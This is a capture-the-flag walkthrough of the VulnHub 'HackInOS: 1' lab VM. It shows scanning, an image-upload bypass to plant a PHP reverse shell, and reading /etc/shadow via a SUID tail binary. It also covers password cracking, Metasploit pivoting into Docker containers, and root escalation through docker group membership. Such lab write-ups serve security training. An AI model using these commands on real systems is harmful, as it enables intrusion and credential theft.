@@ -1,0 +1,144 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">HackInOS:1: Vulnhub Lab Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hackinos1-vulnhub-lab-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-03-14T14:40:51+00:00">March 14, 2019</time><time class="updated" datetime="2025-06-10T20:11:47+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Hello friends! Today we are going to take another boot2root challenge known as “HackInOS: 1”. The credit for making this VM machine goes to “Fatih Çelik” and it is another boot2root challenge in which our goal is to get root access to complete the challenge. You can download this VM <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/hackinos-1,295/#download">here</a></span>.</span></p>
+<p><span style="color: #000000;"><strong>Security Level</strong>: Intermediate</span></p>
+<h3><span style="color: #800000;"><strong>Penetrating Methodology:</strong></span></h3>
+<ul>
+<li><span style="color: #000000;">IP Discovery using netdiscover</span></li>
+<li><span style="color: #000000;">Network scanning (Nmap)</span></li>
+<li><span style="color: #000000;">Surfing HTTP service port</span></li>
+<li><span style="color: #000000;">Finding upload directory</span></li>
+<li><span style="color: #000000;">Finding source code for a web application</span></li>
+<li><span style="color: #000000;">Getting reverse shell</span></li>
+<li><span style="color: #000000;">Pivoting using Metasploit</span></li>
+<li><span style="color: #000000;">Logging in through MySQL and find an SSH credentials</span></li>
+<li><span style="color: #000000;">Logging in through SSH</span></li>
+<li><span style="color: #000000;">Getting the root shell and finding the flag</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Walkthrough</strong></span></p>
+<p><span style="color: #000000;">Let’s start off with scanning the network to find our target.</span></p>
+<pre class="lang:default decode:true">netdiscover</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-9Qhb3mvFbLA/XIo09slUvGI/AAAAAAAAdfk/E9YWRBklH1QNDScrmBnkWUu1PSxdzDViACLcBGAs/s1600/1.png" border="0" data-original-height="183" data-original-width="737"/></span></p>
+<p><span style="color: #000000;">We found our target –&gt; 192.168.1.101</span></p>
+<p><span style="color: #000000;">Our next step is to scan our target with nmap.</span></p>
+<pre class="lang:default decode:true">nmap -p- -sV 192.168.1.101</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-bL1xlCyBCBE/XIo1CMQSYNI/AAAAAAAAdgM/s9aRP_ELpfs2-A1BElnihI-U1YNcxo38gCLcBGAs/s1600/2.png" border="0" data-original-height="197" data-original-width="751"/></span></p>
+<p><span style="color: #000000;">The NMAP output shows us that there are 2 ports open: 22(SSH), 8000(HTTP)</span></p>
+<p><span style="color: #000000;">We find that port 8000 is running HTTP, so we open the IP in our browser and find there is WordPress CMS running on the web server.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Cit6ezm6kzI/XIo1DXcFQUI/AAAAAAAAdgk/3hIhY6B01FU6ZPYBoh75i00AfdVfu3gSgCLcBGAs/s1600/3.png" border="0" data-original-height="431" data-original-width="660"/></span></p>
+<p><span style="color: #000000;">We don’t find any vulnerable plugin or theme on the CMS, so we run a dirb scan to enumerate the directories on the target machine.</span></p>
+<pre class="lang:default decode:true">dirb http://192.168.1.101:8000/</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-6QpgL4CgH1Y/XIo1D66GAeI/AAAAAAAAdgo/ETnObcHmKokvNvOHM5Y8-2Hp-Q7xstzNwCLcBGAs/s1600/4.png" border="0" data-original-height="499" data-original-width="582"/></span></p>
+<p><span style="color: #000000;">Dirb scan gave us “robots.txt”, we open it and find a link to “upload.php” and “/uploads”.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4X1cJtQ74lE/XIo1EKvCDVI/AAAAAAAAdgs/UIhgri0gILEp6rVAeiWkT3hlMIT6EhVMQCLcBGAs/s1600/5.png" border="0" data-original-height="247" data-original-width="526"/></span></p>
+<p><span style="color: #000000;">We open upload.php and find a page where we can upload images. Here we try to upload an image and get a smiling face, it looks like it means there is an error uploading the file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-r5H9vhXO6ww/XIo1EeEi5xI/AAAAAAAAdgw/_1r7iU_NtrIh75s6_v4dUg2uYkxxWQlvQCLcBGAs/s1600/6.png" border="0" data-original-height="255" data-original-width="775"/></span></p>
+<p><span style="color: #000000;">We open the source code of the web page and inside a comment we find a GitHub link.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ALt067kIAC0/XIo1Ek40LEI/AAAAAAAAdg0/knftd4_OxfE9b1rc42aCLZYEBgpqSy2RACLcBGAs/s1600/7.png" border="0" data-original-height="946" data-original-width="639"/></span></p>
+<p><span style="color: #000000;">We open the GitHub link and find there is a source code for the upload.php file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-RO051Q2ek_I/XIo1E5b6BYI/AAAAAAAAdg4/hooqHvFdoAcqa578QJxil7Ev9dxCvEhBgCLcBGAs/s1600/8.png" border="0" data-original-height="876" data-original-width="976"/></span></p>
+<p><span style="color: #000000;">Now to upload the image we just need to add “GIF98” to the start of the php reverse shellcode we want to upload.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-b76p9kXfuSc/XIo1FNVC-tI/AAAAAAAAdg8/_G20LamC_n8C9XQNbkrF9wanoiO86q-0ACLcBGAs/s1600/9.png" border="0" data-original-height="694" data-original-width="748"/></span></p>
+<p><span style="color: #000000;">Now when we upload our php reverse shell, we are successfully able to upload the shell. But we do not know the filename after it is uploaded on the server.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-0AQlwy1X0fw/XIo09ubE5UI/AAAAAAAAdfc/auUEWdfvW7Mf74FvKAVZ3fQRA7S-qYBXQCLcBGAs/s1600/10.png" border="0" data-original-height="201" data-original-width="771"/></span></p>
+<p><span style="color: #000000;">Taking a look at the source code of “upload.php” we find that after the shell is uploaded the file gets renamed to “md5(&lt;filename&gt;&lt;random number )between 1 – 100&gt;.&lt;file extension&gt;”. So, we create a python script that creates a text file filled with all the 100 md5 filename.  You can download the script from <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/Sayantan5/HackInOS">here</a></span>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-KbuRdNRc3mE/XIo09oVC8II/AAAAAAAAdfg/EBv8RSJG0E0hYI9c3KyqYIwUafS1pcYlACLcBGAs/s1600/11.png" border="0" data-original-height="292" data-original-width="491"/></span></p>
+<p><span style="color: #000000;">Now we run the python script and use dirb to bruteforce the new file name.</span></p>
+<pre class="lang:default decode:true">dirb http://192.168.1.101:8000/uploads/ dict.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OErVzrrULLE/XIo0-X75ShI/AAAAAAAAdfo/pdLT8tm0708D6Pr46K3dTJVwqFEmzwyEQCLcBGAs/s1600/12.png" border="0" data-original-height="326" data-original-width="782"/></span></p>
+<p><span style="color: #000000;">We set up the listener, and again run the dirb command again and get a reverse shell.</span></p>
+<pre class="lang:default decode:true">nc -lvp 1234
+dirb http://192.168.1.101:8000/uploads/ dict.txt</pre>
+<p><span style="color: #000000;">After getting a reverse shell, we spawn a TTY shell and we find that we are inside a Docker container. We find all files with SUID bit set and find that “tail” command has SUID bit set. So, we use the “tail” command to open “/etc/shadow”.</span></p>
+<pre class="lang:default decode:true">python -c "import pty;pty.spawn('/bin/bash')"
+find / -perm -4000 2&gt;/dev/null
+tail -c1G /etc/shadow</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-atGeNiSu4QA/XIo0-vfSZbI/AAAAAAAAdfs/0Cib6YMUeZoUgGQ_QOairhQa19KRE4NmACLcBGAs/s1600/13.png" border="0" data-original-height="781" data-original-width="733"/></span></p>
+<p><span style="color: #000000;">We get the password for “root” user from /etc/shadow file and we copy and save it in our system. We crack the hash using john the ripper and find the password to be “john”.</span></p>
+<pre class="lang:default decode:true">john hash</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-bm82wggsmhY/XIo0_MDyFRI/AAAAAAAAdf0/35PgG6ZIppQqnK5_xsXJBWc7YwrvEmcBgCLcBGAs/s1600/14.png" border="0" data-original-height="311" data-original-width="795"/></span></p>
+<p><span style="color: #000000;">After finding the password, we switch to the root user. After becoming a root user, we switch to “/root” directory and find a file called “flag”. We open the “flag” file and find nothing useful.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-eXUMuhnLZ2E/XIo0_sjKKqI/AAAAAAAAdf4/Dnc7rPuXkzI_wX5G5g06SIstx9AcFXP-wCLcBGAs/s1600/15.png" border="0" data-original-height="239" data-original-width="440"/></span></p>
+<p><span style="color: #000000;">Further enumerating the system, inside /var/www/html/wp-config.php. We open the username and password for database login. There is no MySQL service running on the machine and we are also not able to login through SSH using these credentials.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-SrqM8X7Vojo/XIo0-jXjdqI/AAAAAAAAdfw/9ZnqyZao5J8CcOmq3Evi62UMcNI6T8NgwCLcBGAs/s1600/14.1.png" border="0" data-original-height="542" data-original-width="716"/></span></p>
+<p><span style="color: #000000;">Getting back inside /root directory, we find a file called “.port”. We open the file and find a hint to look for other containers.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-_H4HtqxYJJs/XIo1AGTtABI/AAAAAAAAdf8/TdYUTSbbVjInC67PTsE75tqJIEtHqC5RACLcBGAs/s1600/16.png" border="0" data-original-height="655" data-original-width="684"/></span></p>
+<p><span style="color: #000000;">To further interact with the shell, we get a meterpreter reverse shell. We use the web_delivery module in Metasploit-framework to get a reverse shell.</span></p>
+<pre class="lang:default decode:true">msf5 &gt; use exploit/multi/script/web_delivery
+msf5 exploit(multi/script/web_delivery) &gt; setg lhost eth0
+msf5 exploit(multi/script/web_delivery) &gt; setg lport 8888
+msf5 exploit(multi/script/web_delivery) &gt; run</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-TCr08JAS1os/XIo1AjUnkeI/AAAAAAAAdgA/KFq9BK4ZZy0YQAHyW7m0OGak1SL89afcQCLcBGAs/s1600/17.png" border="0" data-original-height="279" data-original-width="936"/></span></p>
+<p><span style="color: #000000;">We copy the command provided by web_delivery module and run it on the target machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-ojrP5gTGj3o/XIo1BBzGrRI/AAAAAAAAdgE/9RCqEAprGYElDip4JHEO7ORJF5hJHD6KgCLcBGAs/s1600/18.png" border="0" data-original-height="67" data-original-width="884"/></span></p>
+<p><span style="color: #000000;">As soon as we run the command on the target machine, we get a reverse shell. After getting a reverse shell, we use autoroute module in Metasploit-framework for pivoting.</span></p>
+<pre class="lang:default decode:true">msf5 &gt; use post/multi/manage/autoroute
+msf5 post(multi/manage/autoroute) &gt; set session 1
+msf5 post(multi/manage/autoroute) &gt; exploit</pre>
+<p><span style="color: #000000;">Then we use the ping_sweep module to find all the machines on the new network.</span></p>
+<pre class="lang:default decode:true">msf5 &gt; use post/multi/gather/ping_sweep
+msf5 post(multi/gather/ping_sweep) &gt; set rhosts 172.18.0.0-255
+msf5 post(multi/gather/ping_sweep) &gt; set session 1
+msf5 post(multi/gather/ping_sweep) &gt; exploit</pre>
+<p><span style="color: #000000;">Then we run a portscan module to find all the ports on all the machines.</span></p>
+<pre class="lang:default decode:true">msf5 &gt; use auxiliary/scanner/portscan/tcp
+msf5 auxiliary(scanner/portscan/tcp) &gt; set rhosts 172.18.0.0-4
+msf5 auxiliary(scanner/portscan/tcp) &gt; set threads 10
+msf5 auxiliary(scanner/portscan/tcp) &gt; exploit</pre>
+<p><span style="color: #000000;">We find the following ports open on the following machines:</span></p>
+<table>
+<tbody>
+<tr>
+<td width="137"><span style="color: #000000;">172.18.0.1</span></td>
+<td width="137"><span style="color: #000000;">22,8000</span></td>
+</tr>
+<tr>
+<td width="137"><span style="color: #000000;">172.18.0.2</span></td>
+<td width="137"><span style="color: #000000;">80</span></td>
+</tr>
+<tr>
+<td width="137"><span style="color: #000000;">172.18.0.3</span></td>
+<td width="137"><span style="color: #000000;">3306</span></td>
+</tr>
+<tr>
+<td width="137"><span style="color: #000000;">172.18.0.4</span></td>
+<td width="137"><span style="color: #000000;">2021</span></td>
+</tr>
+</tbody>
+</table>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-naMefZ3rr3I/XIo1BtNyINI/AAAAAAAAdgI/b6AdtGOHPP4aAQpVDhpYpqskOfhrDv-LwCLcBGAs/s1600/19.png" border="0" data-original-height="776" data-original-width="764"/></span></p>
+<p><span style="color: #000000;">As we know port 3306 is for MySQL service and we also have username and password for WordPress database. So, we can login through MySQL on target “172.18.0.3” and use credentials “wordpress:wordpress”.</span></p>
+<pre class="lang:default decode:true">meterpreter &gt; shell
+python -c "import pty;pty.spawn('/bin/bash')"
+mysql -u wordpress -p wordpress -h 172.18.0.3</pre>
+<p><span style="color: #000000;">After logging in we check all the databases on the MySQL server.</span></p>
+<pre class="lang:default decode:true">show databases;</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-u_ZLqQtrh9g/XIo1CW3MODI/AAAAAAAAdgQ/cOulOKiKN28u6Dv47xTUrXfRYJwIkNqQACLcBGAs/s1600/20.png" border="0" data-original-height="533" data-original-width="740"/></span></p>
+<p><span style="color: #000000;">We now check all the tables available on the database and find a table called “host_ssh_cred”. We check the columns inside the table and find the username and hash of a password.</span></p>
+<pre class="lang:default decode:true">show tables;
+select * from host_ssh_cred;</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yRmdNRE4jXE/XIo1CtozhJI/AAAAAAAAdgU/YwWwtuQLKnQ4cPlUB17sIMzgGv3IpcDgQCLcBGAs/s1600/21.png" border="0" data-original-height="564" data-original-width="584"/></span></p>
+<p><span style="color: #000000;">We save the hash in our system and use john the ripper to crack the hash</span></p>
+<pre class="lang:default decode:true">john --format=RAW-md5 sshpass</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wxDk-5b-keA/XIo1C2j3pbI/AAAAAAAAdgY/1hSZvvzaiOYRWWt5t6cLa5tc2AtbU9bNgCLcBGAs/s1600/22.png" border="0" data-original-height="229" data-original-width="712"/></span></p>
+<p><span style="color: #000000;">Now we have the credentials for SSH; hummingbird:123456. We login through SSH and now when we run the id command, we find that we are a member of the docker group. Some containers have a dedicated group to allow unprivileged users to manage their containers without having to escalate their privileges. To exploit this vulnerability, we first need to check the docker images that are available.</span></p>
+<pre class="lang:default decode:true">ssh hummingbirdscyber@192.168.1.101
+id
+docker images</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OonAXAPSwEc/XIo1DUZNGtI/AAAAAAAAdgg/qenabSk0sAMoTMFyQxVtcfMPwh7LBOScACLcBGAs/s1600/23.png" border="0" data-original-height="417" data-original-width="797"/></span></p>
+<p><span style="color: #000000;">We find that the Ubuntu image is available to us, so we use this to create a new docker container and mount the / directory of the host inside a folder called /root. After we run the docker image we go to /root/root and find a file called “flag”. When we open the file, we find our congratulatory flag.</span></p>
+<pre class="lang:default decode:true">docker run -v /:/root -i -t ubuntu /bin/bash
+cd /root
+cd root
+cat flag</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-wg5bQOtV8IE/XIo1DM-vrHI/AAAAAAAAdgc/UTcQKVh_uzQb09UNVckmpU4q7SGs5jFswCLcBGAs/s1600/24.png" border="0" data-original-height="614" data-original-width="784"/></span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast</span><strong><span style="color: #000000;">. Contact</span> <a href="https://www.linkedin.com/in/sayantan-bera-2098a613b/">Here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
